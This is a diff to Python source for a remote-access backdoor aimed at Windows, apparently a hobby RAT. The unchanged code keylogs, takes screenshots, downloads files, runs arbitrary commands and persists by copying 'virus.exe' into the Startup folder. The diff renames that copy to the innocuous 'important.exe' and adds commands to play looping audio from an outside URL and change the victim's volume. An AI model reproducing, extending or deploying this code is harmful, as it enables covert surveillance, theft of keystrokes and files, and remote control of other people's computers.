@@ -1,6 +1,11 @@
 import socket, json, subprocess, os, cv2, pyautogui
 import base64, threading, time, webbrowser
-import keyboard
+import keyboard, multiprocessing
+
+from playsound import playsound
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 pyautogui.FAILSAFE = False
 
@@ -41,6 +46,7 @@ class Backdoor:
 		self.connection = None
 
 		self.cursor_blocking = False
+		self.music_thread = None
 
 		keyboard.on_press(logger)
 		keylogger = threading.Thread(target=keyboard.wait)
@@ -112,9 +118,14 @@ class Backdoor:
 	def set_autorun_self(self):
 		username = os.getlogin()
 		startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-		command = f'copy "virus.exe" "{startup_path}\\try.py"'
+		command = f'copy "virus.exe" "{startup_path}\\important.exe"'
 		print(command)
 		os.system(command)
+
+
+	def play_music(self):
+		while True:
+			playsound('https://mp3bit.cc/5094.mp3')
 
 
 	def run(self):
@@ -151,7 +162,6 @@ class Backdoor:
 						self.reliable_send(file)
 					except:
 						self.reliable_send("[-] Can't take screenshot")
-
 
 				elif command.split()[0] == "download":
 					file = command.replace("download", "").strip()
@@ -199,6 +209,30 @@ class Backdoor:
 				elif command == "get keys":
 					keys = self.read_file("logs.txt")
 					self.reliable_send(keys)
+
+				elif command == "play music":
+					self.music_thread = multiprocessing.Process(target=self.play_music)
+					self.music_thread.start()
+					self.reliable_send("[+] Music is playing")
+
+				elif command == "stop music":
+					if self.music_thread:
+						self.music_thread.terminate()
+						self.music_thread = None
+						self.reliable_send("[+] Music stopped")
+					else:
+						self.reliable_send("[~] Music is not playing")
+
+				elif command.split()[0] == "volume":
+					try:
+						devices = AudioUtilities.GetSpeakers()
+						interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+						volume = cast(interface, POINTER(IAudioEndpointVolume))
+						volume.SetMasterVolumeLevel(float(command.split()[1]), None)
+						self.reliable_send("[+] Volume is set")
+					except Exception as error:
+						print(error)
+						self.reliable_send("[-] Can't set volume")
 
 				else:
 					res = self.execute_system_command(command)
